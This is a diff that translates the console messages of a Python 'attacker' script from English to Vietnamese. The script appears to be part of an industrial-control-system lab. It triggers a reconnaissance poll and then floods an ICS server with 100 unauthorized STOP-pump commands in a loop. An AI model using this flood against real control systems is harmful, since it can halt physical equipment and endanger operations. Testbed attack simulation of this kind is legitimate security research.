@@ -44,20 +44,20 @@ def run_dnp3_attacker():
 
 	retries = 0
 	while connection.state != c104.ConnectionState.OPEN:
-		print(f"[Attacker] Waiting for DNP3 server at {connection.ip}:{connection.port} ...")
+		print(f"[Attacker] Đang chờ DNP3 server tại {connection.ip}:{connection.port} ...")
 		time.sleep(3)
 		retries += 1
 		if retries > 20:
-			print("[Attacker] Connection timeout. Exiting.")
+			print("[Attacker] Hết thời gian kết nối. Thoát.")
 			return
 
-	print(f"[Attacker] Connected to DNP3 server at {connection.ip}:{connection.port}")
+	print(f"Kết nối thành công đến DNP3 Server! (Attacker)")
 
 	while True:
-		print("\n--- START ATTACK CAMPAIGN ---")
+		print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG ---")
 
 		# Phase 1: Reconnaissance by triggering an integrity poll (GI equivalent).
-		print("[PHASE 1] Reconnaissance: trigger integrity poll...")
+		print("[PHASE 1] Quét: gửi integrity poll...")
 		try:
 			gi_ok = connection.interrogation(
 				common_address=1,
@@ -65,19 +65,19 @@ def run_dnp3_attacker():
 				qualifier=c104.Qoi.STATION,
 			)
 			if gi_ok:
-				print(f" [+] Attacker triggered integrity poll successful.")
+				print(f" [+] Quét integrity poll thành công.")
 				push_metric("attack_recon", "gi_ok", 1)
 			else:
-				print(f" [!] Attacker failed to trigger integrity poll.")
+				print(f" [!] Quét integrity poll thất bại.")
 				push_metric("attack_recon", "gi_ok", 0)
 		except Exception as e:
-			print(f" Recon exception: {e}")
+			print(f" Lỗi khi quét: {e}")
 
 		time.sleep(2)
 
 		# Phase 2: Unauthorized command flood (STOP pump) 100 times.
 		if (gi_ok):
-			print("\n[PHASE 2] Flood attack: send STOP command (C_SC_NA_1, IOA 100) 100 times...")
+			print("\n[PHASE 2] Tấn công DoS: Gửi lệnh STOP bơm (C_SC_NA_1, IOA 100) lặp 100 lần...")
 			success_count = 0
 
 			for i in range(100):
@@ -93,18 +93,18 @@ def run_dnp3_attacker():
 					if ok:
 						success_count += 1
 					else:
-						print(f" Write failed at attempt {i + 1}")
+						print(f" Ghi thất bại ở vòng {i + 1}")
 
 					time.sleep(0.05)
 				except Exception as e:
-					print(f" Write error at attempt {i + 1}: {e}")
+					print(f" Lỗi ghi ở vòng {i + 1}: {e}")
 
-			print(f" [+] Phase 2 complete. Successful STOP commands: {success_count}/100 in {latency:.2f}ms")
-			print("--- END ATTACK CAMPAIGN. WAIT 30 SECONDS ---\n")
+			print(f" [+] Giai đoạn 2 hoàn tất. Thành công gửi {success_count}/100 lệnh STOP.")
+			print("--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---\n")
 			time.sleep(30)
 		else:
-			print(" [!] Skipping Phase 2 due to failed reconnaissance.")
-			print(" [+] Reattempting attack campaign after 15 seconds...\n")
+			print(" [!] Bỏ qua Phase 2 do quét thất bại.")
+			print(" [+] Thử lại sau 15 giây...\n")
 			time.sleep(15)
 
 
